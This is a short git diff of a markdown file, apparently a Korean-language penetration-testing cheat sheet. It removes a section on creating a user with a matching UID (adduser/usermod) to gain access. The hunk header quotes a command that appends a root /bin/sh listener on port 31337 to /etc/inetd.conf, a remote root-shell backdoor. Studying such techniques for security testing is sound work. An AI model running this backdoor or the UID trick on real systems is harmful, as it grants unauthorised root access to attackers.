@@ -361,18 +361,3 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
   
 </details>
 
----
-<details>
-  <summary><strong>usermod</strong></summary>
-
-<img width="1103" height="128" alt="image" src="https://github.com/user-attachments/assets/a3b3641e-69f5-4310-abe2-a4c93982b734" />
-
-- `UID`가 다르게 설정되어 있을 경우 새로운 유저를 만들어 `UID`를 부여해 접근가능.
-```bash
-sudo adduser dummy
-
-sudo usermod -u 2017 dummy
-```
-
-
-</details>
